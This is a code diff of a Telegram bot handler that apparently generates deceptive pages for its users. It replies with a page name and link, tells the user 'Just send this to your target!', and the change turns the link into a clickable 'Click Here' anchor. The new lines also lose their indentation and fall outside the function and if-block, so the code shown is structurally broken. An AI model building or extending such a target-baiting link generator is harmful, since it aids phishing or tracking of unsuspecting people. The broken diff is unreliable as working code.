@@ -62,22 +62,21 @@ async def callback_handler(client, callback_query):
         await loading_message.delete()
 
         # 📝 Send the Generated Link with Copy Button
-        message_text = (
-            f"🛠 <b>Page Name:</b> <code>{page_name}</code>\n"
-            
-            
-            f"🔗 <b>Link:</b> <code>{link}</code>\n\n"
-            
-            f"🎯 Just send this to your target!"
-        )
+message_text = (
+    f"🛠 <b>Page Name:</b> <code>{page_name}</code>\n"
+    
+    f"🔗 <b>Link:</b> <a href='{link}'>Click Here</a>\n\n"
+    
+    f"🎯 Just send this to your target!"
+)
 
-        copy_button = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}_{data}")]
-        ])
+copy_button = InlineKeyboardMarkup([
+    [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}_{data}")]
+])
 
-        await callback_query.message.reply_text(
-            message_text, reply_markup=copy_button, parse_mode=enums.ParseMode.HTML
-        )
+await callback_query.message.reply_text(
+    message_text, reply_markup=copy_button, parse_mode=enums.ParseMode.HTML
+)
     else:
         await callback_query.answer("❌ Invalid selection!", show_alert=True)
 
